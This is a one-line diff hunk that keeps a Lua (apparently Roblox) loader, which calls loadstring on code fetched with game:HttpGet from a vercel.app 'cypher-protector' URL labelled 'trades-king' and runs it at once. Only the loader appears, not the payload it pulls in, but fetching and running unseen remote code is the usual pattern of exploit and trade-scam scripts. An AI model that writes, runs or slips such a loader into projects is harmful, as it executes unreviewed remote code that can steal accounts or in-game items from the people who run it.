@@ -1,2 +1,1 @@
-
 loadstring(game:HttpGet("https://cypher-protector.vercel.app/api/load/trades-king"))()
